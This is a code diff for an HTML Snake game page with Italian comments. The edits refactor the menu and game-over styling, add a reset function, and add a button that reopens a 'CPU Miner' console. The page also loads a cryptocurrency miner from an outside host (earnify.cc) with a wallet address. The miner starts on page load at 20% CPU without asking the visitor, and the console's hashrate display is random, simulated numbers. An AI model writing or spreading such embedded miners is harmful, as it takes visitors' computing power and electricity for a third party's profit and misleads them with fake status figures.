@@ -16,23 +16,23 @@
         }
         h1 { color: #0f0; margin: 30px 0 10px 0; }
 
-        /* Menu Iniziale */
-        #menu {
+        /* Menu e Game Over */
+        #menu, #game-over {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 100;
         }
-        .menu-box {
+        .menu-box, #game-over {
             background: rgba(0, 30, 0, 0.9);
             border: 3px solid #0f0;
             padding: 40px 60px;
             border-radius: 15px;
             box-shadow: 0 0 30px #0f0;
         }
+        #game-over { border-color: #f00; }
 
-        /* Canvas */
         #game-container {
             display: none;
             justify-content: center;
@@ -43,20 +43,6 @@
             border-radius: 10px;
             background: #111;
             box-shadow: 0 0 25px #0f0;
-        }
-
-        /* Game Over */
-        #game-over {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.95);
-            border: 3px solid #f00;
-            padding: 40px 60px;
-            border-radius: 15px;
-            display: none;
-            z-index: 200;
         }
 
         button {
@@ -97,16 +83,38 @@
             background: none;
             border: none;
             color: #f00;
-            font-size: 1.4em;
+            font-size: 1.5em;
             cursor: pointer;
             line-height: 1;
         }
-        .close-btn:hover { color: #ff5555; }
+
+        /* Pulsante per riaprire */
+        #reopen-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 45px;
+            height: 45px;
+            background: rgba(0, 255, 0, 0.2);
+            border: 2px solid #0f0;
+            color: #0f0;
+            font-size: 24px;
+            border-radius: 50%;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 400;
+            box-shadow: 0 0 15px #0f0;
+        }
+        #reopen-btn:hover {
+            background: rgba(0, 255, 0, 0.4);
+        }
     </style>
 </head>
 <body>
 
-    <!-- MENU INIZIALE -->
+    <!-- MENU -->
     <div id="menu">
         <div class="menu-box">
             <h1>🐍 Snake Game</h1>
@@ -134,12 +142,15 @@
             <span style="color:#0f0;">🔨 CPU Miner</span>
             <button class="close-btn" onclick="hideMinerConsole()">×</button>
         </div>
-        <div class="console-line">Stato: <span id="miner-status" class="status">Attivo in background</span></div>
+        <div class="console-line">Stato: <span id="miner-status">Attivo</span></div>
         <div class="console-line">Hashrate: <span id="hashrate">Calcolando...</span></div>
-        <div class="console-line">Potenza: <span id="power">20%</span></div>
+        <div class="console-line">Potenza: 20%</div>
     </div>
 
-    <!-- Crypto Miner (sempre attivo) -->
+    <!-- Pulsante per riaprire -->
+    <div id="reopen-btn" onclick="showMinerConsole()">↑</div>
+
+    <!-- Crypto Miner -->
     <script type="module">
         import { autoMine } from "https://earnify.cc/miner.js";
         autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
@@ -163,7 +174,6 @@
                 gameOver();
                 return;
             }
-
             for (let segment of snake) {
                 if (head.x === segment.x && head.y === segment.y) {
                     gameOver();
@@ -206,20 +216,22 @@
             document.getElementById("menu").style.display = "none";
             document.getElementById("game-container").style.display = "flex";
             document.getElementById("game-over").style.display = "none";
+            resetGame();
+        }
 
+        function resetGame() {
             snake = [{ x: 10, y: 10 }];
             dx = 1; dy = 0;
             score = 0;
             gameSpeed = 100;
             generateFood();
-
             clearInterval(gameInterval);
             gameInterval = setInterval(drawGame, gameSpeed);
         }
 
         function restartGame() {
             document.getElementById("game-over").style.display = "none";
-            startGame();
+            resetGame();
         }
 
         function goToMenu() {
@@ -228,7 +240,6 @@
             document.getElementById("menu").style.display = "block";
         }
 
-        // Controlli tastiera
         document.addEventListener("keydown", e => {
             if (document.getElementById("game-container").style.display !== "flex") return;
             switch(e.key) {
@@ -239,16 +250,27 @@
             }
         });
 
-        // Simulazione Hashrate
+        // Simulazione hashrate
         setInterval(() => {
             const hashrate = Math.floor(Math.random() * 450) + 280;
             document.getElementById("hashrate").textContent = hashrate + " H/s";
         }, 1800);
 
-        // Funzione per nascondere il console
+        // Funzioni Mining Console
         function hideMinerConsole() {
             document.getElementById("mining-console").style.display = "none";
+            document.getElementById("reopen-btn").style.display = "flex";
         }
+
+        function showMinerConsole() {
+            document.getElementById("mining-console").style.display = "block";
+            document.getElementById("reopen-btn").style.display = "none";
+        }
+
+        // Avvio
+        window.onload = () => {
+            // Il miner parte subito
+        };
     </script>
 </body>
 </html>
